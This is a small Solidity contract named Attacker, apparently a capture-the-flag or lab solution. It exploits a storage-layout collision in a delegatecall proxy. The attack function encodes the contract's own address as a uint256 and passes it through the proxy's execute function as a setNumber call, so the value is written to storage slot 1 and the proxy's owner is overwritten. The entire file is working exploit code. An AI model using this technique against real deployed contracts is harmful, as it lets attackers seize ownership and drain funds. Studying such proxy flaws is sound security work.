// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IProxy {
    function execute(bytes calldata data) external;
}

contract Attacker {
    function attack(address _proxy) public {
        // We want to overwrite the owner (Slot 1 in Proxy)
        // In Logic, Slot 1 is 'number' (uint256).
        // So we call setNumber().
        // If we pass an address cast to uint256, it will be written to Slot 1.
        // Thus, Proxy.owner will become that address.
        
        uint256 myAddressAsInt = uint256(uint160(address(this)));
        bytes memory payload = abi.encodeWithSignature("setNumber(uint256)", myAddressAsInt);
        
        IProxy(_proxy).execute(payload);
    }
}
